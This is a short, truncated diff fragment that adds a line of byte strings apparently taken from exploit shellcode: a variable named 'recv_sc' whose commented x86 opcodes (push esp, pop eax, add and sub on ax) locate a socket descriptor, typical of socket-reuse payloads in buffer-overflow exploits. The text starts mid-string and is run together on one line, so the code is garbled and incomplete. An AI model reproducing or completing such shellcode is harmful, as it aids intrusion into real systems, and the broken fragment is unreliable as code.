@@ -1,0 +1,1 @@
+\xb2\x61\xe8\x2e " recv_sc = ( # get socket descriptor in esi b " \x54 " # push esp b " \x58 " # pop eax b " \x66\x05\x49\x01 " # add ax, 0x149 b " \x66\x2d\x01\x01 " # sub
